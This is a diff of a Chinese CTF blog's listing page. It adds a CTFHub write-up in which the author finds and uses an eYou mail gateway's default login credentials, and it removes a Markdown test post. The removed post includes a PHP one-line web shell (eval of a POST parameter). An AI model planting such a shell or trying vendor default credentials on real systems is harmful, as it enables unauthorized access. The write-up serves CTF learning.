@@ -74,6 +74,57 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-CTFHUB-密码口令-默认口令" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/10/14/CTFHUB-%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4-%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/" class="article-date">
+  <time class="dt-published" datetime="2022-10-14T02:41:09.000Z" itemprop="datePublished">2022-10-14</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTFHUB-web-writeup/">CTFHUB_web_writeup</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/10/14/CTFHUB-%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4-%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/">CTFHUB-密码口令-默认口令</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>前置知识：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">默认口令：</span><br><span class="line">百度上没有找到合适的解释，我自己的理解就是一些网络产品，比如路由器，防火墙软件，某某管理系统等等，这些产品是需要使用账号密码进行登录使用，默认口令就是这些产品的默认账户密码，是用户未更改的。这些默认账号密码是可以通过搜索引擎找到的。</span><br></pre></td></tr></table></figure>
+
+<p>进入靶机，发现是一个亿邮邮件网关的登录页面，</p>
+<p><img src="/2022/10/14/CTFHUB-%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4-%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/2.png"></p>
+<p>直接去百度找该产品的默认账户密码</p>
+<p><img src="/2022/10/14/CTFHUB-%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4-%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/3.png"></p>
+<p>一个一个试，最终确认账户密码为eyougw，admin@(eyou)，登录得到flag</p>
+<p><img src="/2022/10/14/CTFHUB-%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4-%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/0.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/10/14/CTFHUB-%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4-%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/" data-id="cl9hxo4hj000v20v43qli2fhk" data-title="CTFHUB-密码口令-默认口令" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-CTFHUB-密码口令-弱口令" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2022/10/14/CTFHUB-%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4-%E5%BC%B1%E5%8F%A3%E4%BB%A4/" class="article-date">
@@ -529,132 +580,11 @@
 
 
   
-    <article id="post-Test-Post" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/10/07/Test-Post/" class="article-date">
-  <time class="dt-published" datetime="2022-10-07T05:06:25.000Z" itemprop="datePublished">2022-10-07</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/web%E5%89%8D%E7%AB%AF/">web前端</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/10/07/Test-Post/">Test Post</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="这是一级标题"><a href="#这是一级标题" class="headerlink" title="这是一级标题"></a>这是一级标题</h1><h2 id="这是二级标题"><a href="#这是二级标题" class="headerlink" title="这是二级标题"></a>这是二级标题</h2><h3 id="三级标题哦"><a href="#三级标题哦" class="headerlink" title="三级标题哦"></a>三级标题哦</h3><hr>
-<p>这是分割线哦</p>
-<hr>
-<p><em>斜体</em> <strong>粗体</strong> <em><strong>又斜体又粗体</strong></em><br>换行<br>换行</p>
-<p>换行<br>啊哈哈</p>
-<p><a target="_blank" rel="noopener" href="https://www.baidu.com/">一个百度链接</a><br>一个百度链接(<a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a>)</p>
-<p>好奇怪啊，为什么我的链接字样是在中间的，我没有给他们样式啊，奇奇怪怪的</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//这是一句话木马，连接密码是cmd</span></span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<ol>
-<li>START</li>
-<li>首先</li>
-<li>其次</li>
-<li>接着</li>
-<li>然后</li>
-<li><!--最后--></li>
-<li>END</li>
-</ol>
-<hr>
-<ul>
-<li><p>张三</p>
-</li>
-<li><p>李四爹</p>
-<ul>
-<li><p>李四<br>$$</p>
-<p>$$</p>
-<ul>
-<li><p>王五爹</p>
-<ul>
-<li>王五</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<hr>
-<p><del>写错了，删了它</del></p>
-<p><u>用下划线做个笔记吧</u></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;HelloWorld&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th align="center">姓名</th>
-<th align="center">张三</th>
-<th align="center">李四</th>
-<th align="center">王五</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">年龄</td>
-<td align="center">22</td>
-<td align="center">21</td>
-<td align="center">32</td>
-</tr>
-<tr>
-<td align="center">性别</td>
-<td align="center">男</td>
-<td align="center">男</td>
-<td align="center">男</td>
-</tr>
-</tbody></table>
-<p>HTML[^1]是个啥东东？？</p>
-<p>不过特殊<br>这样应该就可以了 比如、前面加个反斜杠&amp;  </p>
-<p>代办事项</p>
-<ul>
-<li><input disabled type="checkbox"> 支持以 PDF 格式导出文稿</li>
-<li><input disabled type="checkbox"> 改进 Cmd 渲染算法，使用局部渲染技术提高渲染效率</li>
-<li><input checked disabled type="checkbox"> 新增 Todo 列表功能</li>
-</ul>
-<hr>
-<ul>
-<li><input checked disabled type="checkbox"> 爱着宝贝</li>
-<li><input checked disabled type="checkbox"> 想宝贝</li>
-<li><input disabled type="checkbox"> 娶宝贝作老婆</li>
-</ul>
-<hr>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/10/07/Test-Post/" data-id="cl9hxo4hk001220v43s2hf6sc" data-title="Test Post" class="article-share-link">分享</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
     
-    <a class="extend prev" rel="prev" href="/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+    <a class="extend prev" rel="prev" href="/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">下一页 &raquo;</a>
   </nav>
 
 </section>
@@ -680,7 +610,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">归档</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/10/">十月 2022</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">十一月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/10/">十月 2022</a></li></ul>
     </div>
   </div>
 
@@ -691,6 +621,10 @@
     <h3 class="widget-title">最新文章</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2022/11/21/%E5%A4%8D%E6%B4%BBGoogle%E7%BF%BB%E8%AF%91/">复活Google翻译</a>
+          </li>
         
           <li>
             <a href="/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/">由NSSCTF-SWPUCTF-ez_ez_unserialize，引发对反序列具体详细过程以及对__construct，__destruct函数执行情况深度分析</a>
@@ -706,10 +640,6 @@
         
           <li>
             <a href="/2022/10/15/CTFHUB-SSRF-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/">CTFHUB-SSRF-端口扫描</a>
-          </li>
-        
-          <li>
-            <a href="/2022/10/15/CTFHUB-SSRF-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/">CTFHUB-SSRF-伪协议读取文件</a>
           </li>
         
       </ul>
